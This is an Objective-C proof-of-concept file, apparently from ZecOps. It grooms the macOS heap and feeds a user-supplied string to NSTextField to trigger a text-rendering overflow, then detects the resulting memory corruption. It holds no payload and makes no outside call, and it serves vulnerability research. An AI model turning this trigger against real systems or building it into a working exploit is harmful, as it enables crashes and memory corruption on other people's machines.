// (c) ZecOps, Inc. 2017-2019
// All rights reserved
// No warranty. Use at your own risk. For educational purposes only.
// Interested in vulnerability analysis, exploits and digital forensics? join ZecOps Reverse Bounty at https://www.ZecOps.com

// clang -framework Foundation -framework Cocoa telugu_poc.m -o telugu_poc
// DYLD_INSERT_LIBRARIES=/usr/lib/libgmalloc.dylib ./telugu_poc

#include <stdlib.h>
#import <Cocoa/Cocoa.h>
#import <Foundation/Foundation.h>

struct demo
{
    uint64_t len;
    char content[56];
};


int main(int argc, const char *argv[]) {
    int size = 500000;
    struct demo *ptr[size];
    if (argc < 2)return -1;

    for (int i = 0; i < size; ++i)
    {
        ptr[i] = malloc(sizeof(struct demo));
        ptr[i]->len = 8;
    }
    for (int i = 0; i < size; i+=2)
    {
        free(ptr[i]);
    }

    //trigger overflow
    @autoreleasepool {
        [NSTextField textFieldWithString:[NSString stringWithUTF8String:argv[1]]];
    }

    for (int i = 1; i < size; i+=2)
    {
        if (ptr[i]->len != 8)
        {
            printf("addr= %p , len=%d\n", ptr[i], ptr[i]->len);
            __asm("int3");
        }
    }
    return 0;
}
